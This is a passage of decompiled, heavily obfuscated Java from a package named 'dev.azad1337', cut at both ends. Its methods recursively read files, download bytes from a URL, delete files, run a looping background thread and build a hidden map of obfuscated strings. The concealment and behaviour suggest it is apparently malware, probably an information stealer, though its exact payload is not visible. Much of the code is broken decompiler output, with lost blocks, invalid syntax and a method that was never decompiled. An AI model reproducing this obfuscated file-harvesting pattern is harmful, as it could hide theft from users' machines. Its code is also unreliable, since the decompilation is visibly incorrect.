                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, 8603772392041884977L, a4) /* invoke-custom */;
                } catch (Throwable th2) {
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(th, th2, 8594232028209999849L, a4) /* invoke-custom */;
                }
            }
            throw th;
        }
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: k */
    public void mo51k(Object[] objArr) {
    }

    /* JADX WARN: Code restructure failed: missing block: B:34:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v11, types: [java.lang.Throwable, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v13, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v22, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v26, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    /* renamed from: l */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private void m59l(Object[] a) {
        File a2 = (File) a[0];
        long a3 = ((Long) a[1]).longValue();
        long a4 = a3 ^ 0;
        File[] B = (File[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(File[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a2, 5091893687404659946L, a3) /* invoke-custom */;
        if (B == 0) {
            return;
        }
        for (?? r0 : B) {
            try {
                ?? B2 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, 5077955959090509104L, a3) /* invoke-custom */;
                if (B2 != 0) {
                    Object[] objArr = new Object[2];
                    r0[1] = Long.valueOf(a4);
                    objArr[0] = objArr;
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, objArr, 5065967393251849071L, a3) /* invoke-custom */;
                } else {
                    String a5 = (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, 5092282263305885162L, a3) /* invoke-custom */, 5078806679075394862L, a3) /* invoke-custom */;
                    if (!(boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m69a((-283373340) - 27148, 283373340 + 23303, (int) a3), 5073117811239593754L, a3) /* invoke-custom */) {
                        ?? B3 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m69a((-283373340) - 27209, (-283373340) - 8768, (int) a3), 5073117811239593754L, a3) /* invoke-custom */;
                        if (B3 == 0) {
                            try {
                                ?? B4 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m69a((-283373340) - 27158, 283373340 + 14897, (int) a3), 5073117811239593754L, a3) /* invoke-custom */;
                                if (B4 == 0 && !(boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, m69a((-283373340) - 27200, 283373340 + 31474, (int) a3), 5073117811239593754L, a3) /* invoke-custom */) {
                                }
                                try {
                                    C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, (int) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(Integer.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 5087186075789714047L, a3) /* invoke-custom */ + ((String[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String[].class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new String((byte[]) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(byte[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Path) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Path.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, 5074755991732353698L, a3) /* invoke-custom */, 5092993149120014735L, a3) /* invoke-custom */), m69a((-283373340) - 27224, (-283373340) - 32753, (int) a3), 5075551981494249094L, a3) /* invoke-custom */.length - 1), 5087186075789714047L, a3) /* invoke-custom */;
                                } catch (Exception e) {
                                }
                            } catch (Exception unused) {
                                throw B3;
                            }
                        } else {
                            try {
                                C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, (int) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(Integer.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 5088211303018654688L, a3) /* invoke-custom */ + ((String[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String[].class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new String((byte[]) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(byte[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Path) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Path.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, 5074755991732353698L, a3) /* invoke-custom */, 5092993149120014735L, a3) /* invoke-custom */), "\n", 5075551981494249094L, a3) /* invoke-custom */.length - 2), 5088211303018654688L, a3) /* invoke-custom */;
                            } catch (Exception e2) {
                            }
                        }
                    } else {
                        try {
                            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, (int) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(Integer.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 5094907246436218110L, a3) /* invoke-custom */ + ((String[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String[].class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new String((byte[]) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(byte[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Path) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Path.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, 5074755991732353698L, a3) /* invoke-custom */, 5092993149120014735L, a3) /* invoke-custom */), m69a((-283373340) - 27122, 61212 + ((char) (-28875)), (int) a3), 5075551981494249094L, a3) /* invoke-custom */.length - 1), 5094907246436218110L, a3) /* invoke-custom */;
                        } catch (Exception e3) {
                        }
                    }
                }
            } catch (Exception unused2) {
                throw r0;
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:21:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v11, types: [boolean] */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v16 */
    /* JADX WARN: Type inference failed for: r0v18, types: [long] */
    /* JADX WARN: Type inference failed for: r0v4, types: [java.lang.Object, java.io.File] */
    /* JADX WARN: Type inference failed for: r0v5, types: [java.lang.Throwable] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.lang.Throwable, int] */
    /* renamed from: X */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private void m57X(Object[] a) {
        long a2 = ((Long) a[0]).longValue();
        long a3 = (long) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-1840684257657207427L, a2) /* invoke-custom */ + m71b(2852, 5477756848018315476L ^ a2);
        ?? file = new File((String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m69a((-2061862170) - (-((char) (-29806))), (-2061862170) - (-((char) (-29211))), (int) a2), -1840875560143003227L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-1841024248886981087L, a2) /* invoke-custom */ + m69a((-2061862170) - (-((char) (-29891))), 34074 - ((char) (-3975)), (int) a2));
        while (true) {
            try {
                ?? r0 = ((long) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-1840684257657207427L, a2) /* invoke-custom */ > a3 ? 1 : ((long) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-1840684257657207427L, a2) /* invoke-custom */ == a3 ? 0 : -1));
                if (r0 >= 0) {
                    break;
                }
                try {
                    file = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(file, -1846177975483747980L, a2) /* invoke-custom */;
                    if (file != 0) {
                        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, false, -1853618639664528928L, a2) /* invoke-custom */;
                        (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(file, -1846066522806339950L, a2) /* invoke-custom */;
                        break;
                    } else {
                        try {
                            file = m71b(31519, 3215167414017566954L ^ a2);
                            C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Void.TYPE, Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(file, -1823381452378013937L, a2) /* invoke-custom */;
                        } catch (InterruptedException e) {
                        }
                    }
                } catch (InterruptedException unused) {
                    throw file;
                }
            } catch (InterruptedException unused2) {
                throw file;
            }
        }
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, false, -1853618639664528928L, a2) /* invoke-custom */;
    }

    public C0006G(long a) {
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, true, -3985164025931923526L, a) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, (String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(((long) ((double) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Double.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-4015443456475179747L, a) /* invoke-custom */ * 9.0E9d)) + m71b(32290, 1353685058540995378L ^ a), -3989277137255503738L, a) /* invoke-custom */ + "_" + (long) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-3993141978155095140L, a) /* invoke-custom */, -3998660249755278269L, a) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 0, -3997548771984966961L, a) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 0, -3986371149949803055L, a) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 0, -3987878648258499506L, a) /* invoke-custom */;
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, true, -3988062507117973759L, a) /* invoke-custom */;
    }

    /*  JADX ERROR: IndexOutOfBoundsException in pass: SSATransform
        java.lang.IndexOutOfBoundsException: bitIndex < 0: -1
        	at java.base/java.util.BitSet.get(BitSet.java:628)
        	at jadx.core.dex.visitors.ssa.LiveVarAnalysis.fillBasicBlockInfo(LiveVarAnalysis.java:65)
        	at jadx.core.dex.visitors.ssa.LiveVarAnalysis.runAnalysis(LiveVarAnalysis.java:36)
        	at jadx.core.dex.visitors.ssa.SSATransform.process(SSATransform.java:58)
        	at jadx.core.dex.visitors.ssa.SSATransform.visit(SSATransform.java:44)
        */
    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    /* renamed from: B */
    private java.lang.String m67B(java.lang.Object[] r11) {
        /*
            Method dump skipped, instructions count: 1342
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: dev.azad1337.p001IlIillIliIlIi.impl.C0006G.m67B(java.lang.Object[]):java.lang.String");
    }

    /* JADX WARN: Code restructure failed: missing block: B:12:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Type inference failed for: r0v10, types: [java.lang.Throwable, java.io.ByteArrayOutputStream, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v12, types: [java.lang.Throwable, java.lang.Object, java.io.InputStream] */
    /* JADX WARN: Type inference failed for: r0v21, types: [java.lang.Throwable, int] */
    /* renamed from: O */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private byte[] m61O(Object[] a) {
        String a2 = (String) a[0];
        long a3 = ((Long) a[1]).longValue();
        try {
            HttpURLConnection a4 = (HttpURLConnection) (URLConnection) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(URLConnection.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new URL(a2), -1392461421920861557L, a3) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(35064 + ((char) (-31938)), 35064 + ((char) (-22781)), (int) a3), -1407714049116563222L, a3) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m70a(9184, 5435996712122212122L ^ a3), -1391648352797399455L, a3) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m70a(23801, 4321788930021072907L ^ a3), -1395761643875342078L, a3) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(35064 + ((char) (-31904)), (-1996982520) + (-((char) (-22355))), (int) a3), m69a(35064 + ((char) (-31919)), (-1996982520) + (-((char) (-23932))), (int) a3), -1421993018190435312L, a3) /* invoke-custom */;
            ?? byteArrayOutputStream = new ByteArrayOutputStream();
            ?? B = (InputStream) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(InputStream.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, -1393559477897287616L, a3) /* invoke-custom */;
            try {
                byte[] a5 = new byte[m70a(17463, 8003300700932192458L ^ a3)];
                while (true) {
                    ?? B2 = (int) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Integer.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, a5, -1419075970864994268L, a3) /* invoke-custom */;
                    if (B2 == -1) {
                        break;
                    }
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Integer.TYPE, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(byteArrayOutputStream, a5, 0, B2, -1422374128146475285L, a3) /* invoke-custom */;
                }
                if (B != 0) {
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, -1421180677257906671L, a3) /* invoke-custom */;
                }
                return (byte[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(byte[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(byteArrayOutputStream, -1408890375324023278L, a3) /* invoke-custom */;
            } catch (Throwable th) {
                if (B != 0) {
                    try {
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, -1421180677257906671L, a3) /* invoke-custom */;
                    } catch (Throwable th2) {
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(th, th2, -1412838712791698231L, a3) /* invoke-custom */;
                    }
                }
                throw th;
            }
        } catch (Exception e) {
            return new byte[0];
        }
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: a */
    public void mo52a(Object[] a) {
        long a2 = ((Long) a[0]).longValue();
        long a3 = a2 ^ 80475239043855L;
        long a4 = a2 ^ 133151932016720L;
        long a5 = a2 ^ 110514391725913L;
        long a6 = a2 ^ 64754719543083L;
        long a7 = a2 ^ 1890265343989L;
        try {
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, (String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m69a((-1626185490) - 2983, 1626185490 + 13706, (int) a2), -5369227129899502934L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-5369391357364314834L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, -5372865352047208019L, a2) /* invoke-custom */, -5382237740324206541L, a2) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, (String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, -5382237740324206541L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-5369391357364314834L, a2) /* invoke-custom */ + m69a((-1626185490) - 3025, (-1626185490) - (-1575), (int) a2), -5381837728651803101L, a2) /* invoke-custom */;
            (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new File((String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, -5381837728651803101L, a2) /* invoke-custom */), -5374373061584467947L, a2) /* invoke-custom */;
            (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new File((String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, -5382237740324206541L, a2) /* invoke-custom */), -5374373061584467947L, a2) /* invoke-custom */;
            Object[] objArr = new Object[1];
            this[0] = Long.valueOf(a7);
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr, objArr, -5368920314469153888L, a2) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Void.TYPE, Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m71b(7334, 804355866148510814L ^ a2), -5351044865294488576L, a2) /* invoke-custom */;
            Object[] objArr2 = new Object[1];
            this[0] = Long.valueOf(a5);
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr2, objArr2, -5355476225929958644L, a2) /* invoke-custom */;
            Object[] objArr3 = new Object[1];
            this[0] = Long.valueOf(a4);
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr3, objArr3, -5351176178784079377L, a2) /* invoke-custom */;
            Object[] objArr4 = new Object[1];
            this[0] = Long.valueOf(a6);
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr4, objArr4, -5353435069763071106L, a2) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new Thread(() -> {
                long a8 = 61498074842346L ^ 130855231134090L;
                long a9 = 61498074842346L ^ 58266063486705L;
                while ((boolean) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, -4281840772912520395L, 61498074842346L) /* invoke-custom */) {
                    try {
                        C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Void.TYPE, Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m71b(233, 4245918659999723978L ^ 61498074842346L), -4294381183137227302L, 61498074842346L) /* invoke-custom */;
                        Object[] objArr5 = new Object[1];
                        this[0] = Long.valueOf(a8);
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr5, objArr5, -4294530209006190539L, 61498074842346L) /* invoke-custom */;
                        Object[] objArr6 = new Object[1];
                        this[0] = Long.valueOf(a9);
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr6, objArr6, -4292272186025237852L, 61498074842346L) /* invoke-custom */;
                    } catch (Exception e) {
                    }
                }
            }), -5378302084182185312L, a2) /* invoke-custom */;
            Object[] objArr5 = new Object[1];
            this[0] = Long.valueOf(a3);
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr5, objArr5, -5382093486873673188L, a2) /* invoke-custom */;
        } catch (Exception e) {
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:47:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:57:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:63:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:66:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:82:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:89:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Type inference failed for: r0v24, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v31, types: [java.lang.Throwable, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v34, types: [java.lang.Throwable, java.lang.Object, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v36, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v51, types: [java.lang.Throwable, java.lang.Object, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v53, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v55, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v57, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v59, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v61, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v63, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v65, types: [java.lang.Throwable, boolean] */
    /* renamed from: k */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private String m65k(Object[] a) {
        File[] a2;
        long a3 = ((Long) a[0]).longValue();
        Map<String, String> a4 = new LinkedHashMap<>();
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25221)), 59014 - ((char) (-19907)), (int) a3), m69a(59014 - ((char) (-25250)), (-427419270) - (-((char) (-18961))), (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25237)), (-427419270) - (-((char) (-30516))), (int) a3), m69a(59014 - ((char) (-25247)), (-427419270) - (-((char) (-32231))), (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25240)), (-427419270) - (-((char) (-13479))), (int) a3), m69a(59014 - ((char) (-25295)), 427419270 - 31455, (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25305)), 427419270 - 29281, (int) a3), m69a(59014 - ((char) (-25294)), 59014 - ((char) (-19150)), (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25215)), 59014 - ((char) (-13080)), (int) a3), m69a(59014 - ((char) (-25324)), 59014 - ((char) (-27576)), (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25213)), (-427419270) - (-26646), (int) a3), m69a(59014 - ((char) (-25275)), 59014 - ((char) (-12828)), (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25231)), (-427419270) - (-31156), (int) a3), m69a(59014 - ((char) (-25233)), (-427419270) - (-((char) (-11316))), (int) a3), -6241932861963077001L, a3) /* invoke-custom */;
        List<String> a5 = new ArrayList<>();
        File a6 = new File((String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, -6244072421335164364L, a3) /* invoke-custom */);
